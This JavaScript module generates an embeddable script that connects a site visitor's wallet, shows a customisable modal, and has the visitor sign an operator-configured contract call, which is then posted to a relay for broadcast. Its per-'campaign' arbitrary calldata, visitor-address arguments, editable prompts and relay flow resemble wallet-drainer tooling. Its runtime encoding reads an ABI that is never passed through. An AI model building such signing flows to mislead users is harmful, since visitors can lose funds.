import { Interface, parseEther } from 'ethers';

// AEGIS embed generator.
// Produces a self-contained inline `<script>` that lets a visitor on the
// operator-owned domain connect their own wallet, review a transaction, and
// (in relay mode) sign it — the signed raw tx is handed to the AEGIS relayer
// for broadcast. The embed script never holds private keys.
//
// The bundle is generated server-side so the console preview and the live
// `/bundles/:id.js` endpoint always agree.

const THEMES = {
  'dark-ops': { accent: '#37e0a0', bg: 'rgba(8,12,16,0.92)', panel: '#0d1512', text: '#d9f2e4' },
  militant: { accent: '#ffb454', bg: 'rgba(10,12,10,0.94)', panel: '#161309', text: '#f4ead0' },
  minimal: { accent: '#3da9fc', bg: 'rgba(252,252,252,0.96)', panel: '#ffffff', text: '#111827' },
  custom: { accent: '#3da9fc', bg: 'rgba(8,12,16,0.92)', panel: '#14181d', text: '#e6edf3' },
};

const DEFAULTS = {
  chainId: 1,
  to: '',
  value: '0',
  functionName: '',
  abi: [],
  args: [],
  gasPolicy: 'auto',
  gasLimit: 0,
  theme: 'dark-ops',
  accent: '',
  modal: {
    connectButton: 'Connect Wallet',
    title: 'Connect your wallet',
    signBody: 'Approve this transaction in your wallet.',
    pending: 'Awaiting confirmation…',
    confirmed: 'Transaction confirmed.',
    failed: 'Transaction failed or rejected.',
  },
  protocol: 'reown', // reown | walletconnect-v2 | injected
  projectId: '',
  walletList: [],
  cdnBase: 'https://esm.sh',
  broadcastMode: 'relay', // relay | wallet
  endpoint: '', // POST /api/relay/broadcast — accepts {campaignId, rawTx, origin}
  statusEndpoint: '', // GET /api/campaigns/:id/relay/:jobId — polls job state
  webhookUrl: '',
  manualTrigger: false,
};

export function mergeConfig(cfg = {}) {
  const merged = {
    ...DEFAULTS,
    ...cfg,
    modal: { ...DEFAULTS.modal, ...(cfg.modal ?? {}) },
  };
  // The values baked into the generated script (CFG object).
  merged.ctx = {
    chainId: merged.chainId,
    to: merged.to,
    value: merged.value,
    functionName: merged.functionName,
    args: merged.args,
    gasPolicy: merged.gasPolicy,
    gasLimit: merged.gasLimit,
    theme: merged.theme,
    accent: merged.accent,
    protocol: merged.protocol,
    projectId: merged.projectId,
    walletList: merged.walletList,
    cdnBase: merged.cdnBase,
    broadcastMode: merged.broadcastMode,
    endpoint: merged.endpoint,
    statusEndpoint: merged.statusEndpoint,
    webhookUrl: merged.webhookUrl,
    manualTrigger: merged.manualTrigger,
  };
  return merged;
}

// Pre-encode static (non-wallet-derived) arguments to calldata at forge time.
export function encodeStatic({ abi = [], functionName = '', args = [], value = '0' }) {
  let data = '0x';
  if (functionName && abi.length) {
    const iface = new Interface(abi);
    const fn = iface.getFunction(functionName);
    if (!fn) throw new Error(`function "${functionName}" not in ABI`);
    const inputs = fn.inputs ?? [];
    // Align static args to ABI inputs by position. Wallet-derived args are filled
    // with a type-appropriate zero placeholder here and replaced at runtime by the
    // client's encodeCalldata(), so static pre-encoding stays total (no throw).
    const byIndex = new Map(
      args.map((a, i) => [i, a]).filter(([, a]) => (a?.source ?? 'static') !== 'wallet'),
    );
    const positional = inputs.map((input, i) => {
      const a = byIndex.get(i);
      if (a) return a.value;
      const t = input.type;
      if (t === 'address') return '0x0000000000000000000000000000000000000000';
      if (t === 'bool') return false;
      if (t.startsWith('bytes')) return '0x';
      if (t.startsWith('uint') || t.startsWith('int')) return 0;
      return '';
    });
    data = iface.encodeFunctionData(functionName, positional);
  }
  let valueData = '';
  if (Number(value) > 0) {
    try {
      valueData = `0x${BigInt(parseEther(String(value))).toString(16)}`;
    } catch {
      valueData = '';
    }
  }
  return { data, valueData };
}

// Build the inline script bundle.
export function buildEmbed({ campaign, contract, domain, protocol = 'reown', cfg = {}, endpoint = '', statusEndpoint = '' }) {
  const c = mergeConfig({ ...cfg, protocol, chainId: campaign.chain_id, endpoint, statusEndpoint });
  const theme = THEMES[c.theme] ?? THEMES['dark-ops'];
  const accent = c.accent || theme.accent;
  const contractAddress = contract?.address ?? c.to ?? '';
  const enc = encodeStatic({ abi: c.abi, functionName: c.functionName, args: c.args, value: c.value });

  const payload = {
    domain,
    campaignId: campaign.id,
    contractAddress,
    chainId: campaign.chain_id ?? 1,
    cfg: c.ctx,
    data: enc.data,
    valueData: enc.valueData,
    theme: { ...theme, accent },
  };

  return buildClientScript(JSON.stringify(payload));
}

// The client script is created by stringifying the payload object and
// interpolating it — no nested template literal escapes needed.
function buildClientScript(payloadJson) {
  return `/* AEGIS embed script — generated bundle */
/* Private keys never appear in this script. */
/* Domain-locked: only executes on the origin baked into the bundle. */
/* Relays only operator-authorized (domain-whitelisted) campaigns. */
(function () {
  const P = ${payloadJson};

  const DOMAIN_OK =
    typeof location !== 'undefined' &&
    (location.origin === P.domain || location.hostname === P.domain);

  if (!DOMAIN_OK) {
    console.warn('[aegis] refused: not on whitelisted domain');
    return;
  }

  const CFG = P.cfg;
  const emit = (name, detail) => document.dispatchEvent(new CustomEvent(name, { detail }));
  const esc = (s) => String(s).replace(/[&<>"']/g, (m) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[m]));

  let PROVIDER = null;
  let ACCOUNT = null;

  async function loadProvider() {
    if (CFG.protocol === 'reown' || CFG.protocol === 'walletconnect-v2') {
      if (!CFG.projectId) throw new Error('WalletConnect projectId not configured');
      const mod = await import(CFG.cdnBase + '/@walletconnect/ethereum-provider@2');
      return mod.EthereumProvider.init({
        projectId: CFG.projectId,
        chains: [P.chainId],
        optionalChains: [P.chainId],
        showQrModal: true,
      });
    }
    if (!window.ethereum) throw new Error('No injected wallet detected (e.g. MetaMask)');
    return window.ethereum;
  }

  function buildModal() {
    const wrap = document.createElement('div');
    wrap.style.position = 'fixed';
    wrap.style.inset = '0';
    wrap.style.display = 'none';
    wrap.style.alignItems = 'center';
    wrap.style.justifyContent = 'center';
    wrap.style.zIndex = '99999';
    wrap.style.background = P.theme.bg;
    const panel = document.createElement('div');
    panel.style.cssText = [
      'background:' + P.theme.panel,
      'border:1px solid ' + P.theme.accent + '55',
      'border-radius:16px',
      'padding:28px',
      'max-width:420px',
      'width:90%',
      'color:' + P.theme.text,
      'box-shadow:0 24px 60px rgba(0,0,0,0.4)',
      'font-family:system-ui,sans-serif',
    ].join(';');
    panel.innerHTML =
      '<div style="font-weight:700;font-size:18px;margin-bottom:12px">' + esc(CFG.modal.title) + '</div>' +
      '<div id="aegis-body" style="opacity:0.85;font-size:14px;line-height:1.5;min-height:44px">' + esc(CFG.modal.signBody) + '</div>' +
      '<div style="display:flex;gap:10px;margin-top:18px;justify-content:flex-end">' +
      '<button id="aegis-cancel" style="background:transparent;border:1px solid ' + P.theme.accent + '66;color:' + P.theme.text + ';padding:8px 18px;border-radius:10px;cursor:pointer">Cancel</button>' +
      '<button id="aegis-ok" style="background:' + P.theme.accent + ';color:#04121f;border:0;padding:8px 18px;border-radius:10px;cursor:pointer;font-weight:600">' + esc(CFG.broadcastMode === 'wallet' ? 'Send' : 'Sign & broadcast') + '</button>' +
      '</div>';
    wrap.appendChild(panel);
    document.body.appendChild(wrap);
    return wrap;
  }

  function setBody(modal, text) {
    const el = modal.querySelector('#aegis-body');
    if (el) el.textContent = text;
  }

  async function encodeCalldata(address) {
    if (CFG.functionName && CFG.args && CFG.args.length && CFG.args.some((a) => a.source === 'wallet')) {
      const { Interface } = await import(CFG.cdnBase + '/ethers@6');
      const iface = new Interface(P.cfg.abi);
      const values = CFG.args.map((a) => (a.source === 'wallet' ? address : a.value));
      return iface.encodeFunctionData(CFG.functionName, values);
    }
    return P.data;
  }

  async function run(modal) {
    try {
      PROVIDER = await loadProvider();
      await PROVIDER.request({ method: 'eth_requestAccounts' });
      ACCOUNT = (await PROVIDER.request({ method: 'eth_accounts' }))[0];
      if (!ACCOUNT) throw new Error('No account returned by wallet');
      emit('aegis:connect', { address: ACCOUNT, chainId: P.chainId });

      PROVIDER.on && PROVIDER.on('disconnect', () => { ACCOUNT = null; emit('aegis:disconnect', {}); });
      PROVIDER.on && PROVIDER.on('chainChanged', (id) => emit('aegis:chainchange', { chainId: Number(id) }));

      modal.style.display = 'flex';
      setBody(modal, esc(CFG.modal.signBody));

      const confirmed = await new Promise((resolve) => {
        const okBtn = modal.querySelector('#aegis-ok');
        const cancelBtn = modal.querySelector('#aegis-cancel');
        const done = (v) => { okBtn.onclick = null; cancelBtn.onclick = null; resolve(v); };
        okBtn.onclick = () => done(true);
        cancelBtn.onclick = () => done(false);
      });
      if (!confirmed) { emit('aegis:error', { code: 'user_rejected' }); return; }

      const data = await encodeCalldata(ACCOUNT);
      const params = {
        from: ACCOUNT,
        to: P.contractAddress || undefined,
        data,
        value: P.valueData || undefined,
        chainId: P.chainId,
      };
      if (CFG.gasPolicy === 'manual' && CFG.gasLimit > 0) params.gas = '0x' + Math.round(CFG.gasLimit).toString(16);

      setBody(modal, CFG.modal.pending);

      if (CFG.broadcastMode === 'wallet') {
        const txHash = await PROVIDER.request({ method: 'eth_sendTransaction', params: [params] });
        emit('aegis:tx', { mode: 'wallet', txHash });
        setBody(modal, CFG.modal.confirmed);
        pingWebhook({ event: 'confirmed', txHash, campaignId: P.campaignId });
        return;
      }

      const rawTx = await PROVIDER.request({ method: 'eth_signTransaction', params: [params] });
      const res = await fetch(CFG.endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          campaignId: P.campaignId,
          rawTx,
          origin: location.origin,
          functionName: CFG.functionName || '',
        }),
      });
      if (!res.ok) throw new Error('Relay endpoint rejected broadcast (' + res.status + ')');
      const job = await res.json();
      emit('aegis:tx', { mode: 'relay', job });
      setBody(modal, CFG.modal.pending + ' Relay job ' + job.id);
      pollJob(job, modal);
    } catch (e) {
      console.error('[aegis]', e);
      setBody(modal, esc((CFG.modal.failed || 'Failed: ') + ' ' + (e.message || e)));
      emit('aegis:error', { code: e.message || 'unknown' });
    }
  }

  async function pollJob(job, modal) {
    const statusUrl = CFG.statusEndpoint.replace('{id}', job.campaignId).replace('{jobId}', job.id);
    for (let i = 0; i < 120; i++) {
      await new Promise((r) => setTimeout(r, 1000));
      try {
        const res = await fetch(statusUrl, { headers: { 'Content-Type': 'application/json' } });
        if (!res.ok) continue;
        const data = await res.json();
        if (data.status === 'confirmed') {
          setBody(modal, CFG.modal.confirmed);
          emit('aegis:success', { txHash: data.tx_hash, status: 'confirmed' });
          pingWebhook({ event: 'confirmed', txHash: data.tx_hash, campaignId: P.campaignId });
          return;
        }
        if (data.status === 'failed') {
          setBody(modal, CFG.modal.failed);
          emit('aegis:error', { code: 'relay_failed', reason: data.error });
          return;
        }
      } catch { /* transient */ }
    }
  }

  function pingWebhook(body) {
    if (CFG.webhookUrl) {
      fetch(CFG.webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      }).catch(() => {});
    }
  }

  const modal = buildModal();
  if (!CFG.manualTrigger) {
    const btn = document.createElement('button');
    btn.textContent = esc(CFG.modal.connectButton);
    btn.style.cssText = 'background:' + P.theme.accent + ';color:#04121f;border:0;padding:10px 20px;border-radius:10px;cursor:pointer;font-weight:600;font-family:system-ui';
    btn.onclick = () => run(modal);
    document.body.appendChild(btn);
  } else {
    // The host page orchestrates triggers via the aegis:trigger event.
    document.addEventListener('aegis:trigger', () => run(modal));
  }

  emit('aegis:ready', {
    campaign: P.campaignId,
    contractAddress: P.contractAddress,
    chainId: P.chainId,
    protocol: P.cfg.protocol,
  });
})();
`;
}

export { THEMES };